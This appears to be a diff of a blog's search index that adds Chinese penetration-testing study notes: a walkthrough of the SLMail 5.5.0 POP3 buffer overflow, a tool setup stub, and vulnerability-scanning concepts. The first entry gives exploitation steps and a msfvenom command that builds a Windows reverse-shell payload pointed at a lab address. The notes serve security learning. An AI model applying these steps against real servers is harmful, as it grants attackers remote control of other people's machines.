@@ -4,6 +4,87 @@
   
     
     <entry>
+      <title>缓冲区溢出</title>
+      <link href="/2020/09/19/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+      <url>/2020/09/19/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><ul><li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据</li><li>成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</li></ul><a id="more"></a><h2 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h2><ul><li>源码审计</li><li>逆向工程</li><li>模糊测试<ul><li>向程序堆栈发送半随机的数据，根据内存变化判断溢出</li><li>数据生成器：生成随机、半随机数据</li><li>测试工具：识别溢出漏洞</li></ul></li></ul><h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><ul><li><p>SLMail 5.5.0 Mail Server</p><ul><li>POP3 PASS命令存在缓冲区溢出漏洞</li><li>无需身份验证远程代码执行</li><li>防护机制：<ul><li>DEP: 阻止代码从数据页被执行</li><li>ASLR: 随机内存地址加载执行程序和DLL,每次重启地址变化</li></ul></li></ul><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><ol><li><p>测试PASS命令接收到大量数据时是否会溢出</p></li><li><p>找到精确溢出到EIP的4个字节</p><ul><li><p>二分法 </p></li><li><p>唯一字符串法</p></li></ul></li></ol><ul><li>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2700</li><li>上一条命令即<code>msf-pattern_create -l 2700</code></li><li>然后使用<code>msf-pattern_offset -q Di9D</code></li></ul><ol start="3"><li>找出坏字符</li></ol></li><li><p>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</p><ul><li>返回地址、Shellcode、buffer中都不能出现坏字符</li><li>null (0x00)空字符，用于终止字符串的拷贝操作</li><li>return (0x0D) 回车操作，表示POP3 PASS命令输入完成</li><li>思路：发送0x00-0xff 256个字符，查找所有坏字符</li></ul><ol start="4"><li>重定向数据流</li></ol></li><li><p>用ESP地址替换EIP的值，但是ESP地址变化，不可硬编码。SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</p><ul><li>在内存中寻找地址固定的系统模块，在模块中寻找JMP ESP指令的地址跳转，再由该指令简介跳转到ESP，从而执行shellcode</li><li>mona.py脚本识别内存模块，搜索“return address”是JMP ESP指令的模块</li><li>寻找无DEP、ALSR保护的内存地址</li><li>内存地址不包含坏字符</li></ul></li><li><p>寻找不受保护的系统模块</p><ul><li>!mona modules</li></ul></li><li><p>将汇编指令jmp esp转换为二进制</p><ul><li><code>./nasm_shell.rb</code>或 <code>msf-nasm_shell</code></li><li>FFE4</li></ul></li><li><p>在模块中搜索FFE4指令</p><ul><li><code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code></li><li>选择不包含坏字符的内存地址</li></ul></li><li><p>在该地址设置断点</p></li><li><p>重发buffer</p><ol start="5"><li>生成Shellcode</li></ol></li><li><p>在msfvenom查找相应的payload</p><figure class="hljs highlight plain"><figcaption><span>--list payloads|grep windows|grep reverse_tcp```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs msfvenom"><br>- 查看该payload生成需要哪些参数<br><br>  &#96;&#96;&#96;msfvenom -p windows&#x2F;shell_reverse_tcp --list-options<br></code></pre></td></tr></table></figure></li><li><p><code>msfvenom --platform Windows -b &#39;\x00\x0a\x0d&#39; -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.0.112 -f py</code>  </p></li></ul><ol start="6"><li>在本地侦听4444端口（msfvenom没有写端口参数时的默认端口），执行脚本，拿到控制权。</li></ol><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>汇编指令<ul><li>JMP XXX         跳转到某寄存器</li><li>ADD XXX,12  XXX寄存器后移12位 </li></ul></li><li>注意fuzzing要步步为营，否则很容易混乱。</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SLMail缓冲区溢出实践</title>
+      <link href="/2020/09/18/SLMail%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E8%B7%B5/"/>
+      <url>/2020/09/18/SLMail%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E8%B7%B5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Windows系统</li><li><a href="https://slmail.software.informer.com/download/" target="_blank" rel="noopener">SLMail5.5.0</a></li><li><a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml" target="_blank" rel="noopener">ImmunityDebugger1.85</a></li><li><a href="https://raw.githubusercontent.com/corelan/mona/master/mona.py" target="_blank" rel="noopener">mona.py</a></li></ul><p>mona.py需要放在ImmunityDebugger的安装目录的DebuggerPyCommands文件夹</p><a id="more"></a><p>（国庆节复习来补）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>漏洞扫描</title>
+      <link href="/2020/09/17/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
+      <url>/2020/09/17/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</url>
+      
+        <content type="html"><![CDATA[<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><ul><li><p>发现漏洞</p><ul><li>基于端口服务扫描结果版本信息（速度慢）</li><li>搜索已公开的漏洞数据库（数量大）</li><li>使用弱点扫描器实现漏洞管理</li></ul></li><li><p>服务弱点查找</p><ul><li><p>exploit-db</p></li><li><p>rapid7</p></li><li><p><code>searchsploit tomcat</code></p><ul><li>(/usr/share/exploitdb/exploits)</li></ul></li><li><p>shellstorm</p><a id="more"></a></li></ul></li></ul><h2 id="从信息的维度定义漏洞管理"><a href="#从信息的维度定义漏洞管理" class="headerlink" title="从信息的维度定义漏洞管理"></a>从信息的维度定义漏洞管理</h2><ul><li>信息收集：<ul><li>扫描发现网络IP、OS、服务、配置、漏洞</li><li>能力需求：定义扫描方式内容和目标</li></ul></li><li>信息管理<ul><li>格式化信息，并进行筛选、分组、定义优先级</li><li>能力需求：资产分组、指定所有者、向所有者报告漏洞</li></ul></li><li>信息输出<ul><li>向不同层级的人群展示足够的信息量</li><li>能力需求：生成报告、导出数据、与SIEM集成</li></ul></li></ul><h2 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h2><ul><li>主动扫描<ul><li>有身份验证</li><li>无身份验证</li></ul></li><li>被动扫描<ul><li>镜像端口抓包</li><li>其它来源输入</li></ul></li><li>基于Agent的扫描<ul><li>支持平台有限</li></ul></li></ul><h2 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h2><ul><li><p>CVSS(Common Vulnerability Scoring System)</p><ul><li>通用漏洞评分系统——工业标准</li><li>描述安全漏洞严重程度的统一评分方案</li><li>Base Metric:基础的恒定不变的弱点权重</li><li>Temporal Metric:依赖时间因素的弱点权重</li><li>Environmental Metric:利用弱点的环境要求和实施难度的权重</li></ul></li><li><p>CVE(Common Vulnerabilities and Exposures)</p><ul><li><p>已公开的信息安全漏洞字典，统一的漏洞编号标准</p></li><li><p>MITRE公司负责维护（非盈利机构）</p></li><li><p>扫描器的大部分扫描项都对应一个CVE编号</p></li><li><p>实现不同厂商之间信息交换的统一标准</p></li><li><p>CVE发布流程</p><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List——CVE-2008-4250</li><li>MITRE负责对内容进行编辑维护</li></ul></li><li><p>很多厂商维护自己的Vulnerability Reference</p><ul><li>MS</li><li>MSKB</li></ul></li><li><p>其它Vulnerability Reference</p><ul><li>CERT TA08-297A</li><li>BID 31874</li><li>IAVM 2008-A-0081</li><li>OVAL OVAL6093</li></ul></li><li><p>OVAL(Open Vulnerability and Assessment language)</p><ul><li>描述漏洞检测方法的机器可识别语言</li><li>详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</li><li>OVAL使用XML语言描述，包含了严密的语法逻辑</li></ul></li><li><p>CCE</p><ul><li>描述软件配置缺陷的标准化格式</li></ul></li><li><p>CPE(Common Product Enumeration)</p><ul><li>信息技术产品，系统，软件包的结构化命名规范分类命名</li></ul></li><li><p>CWE(Common Weakness Enumeration)</p><ul><li>常见漏洞类型的字典</li></ul></li><li><p>SCAP(Security Content Automation Protocol)</p><ul><li>SCAP是一个集合了多重安全标准框架</li><li>六个元素：CVE、OVAL、CCE、CPE、CVSS、XCCDF</li><li>目的是以标准方法展示和操作安全数据</li><li>由NIST负责维护</li></ul></li></ul><h2 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h2><ul><li>周期性扫描跟踪漏洞</li><li>高危漏洞优先处理</li><li>扫描注意事项</li><li>漏洞管理三要素<ul><li>准确性</li><li>时间</li><li>资源</li></ul></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>主动信息收集-防火墙与负载均衡识别</title>
       <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
       <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
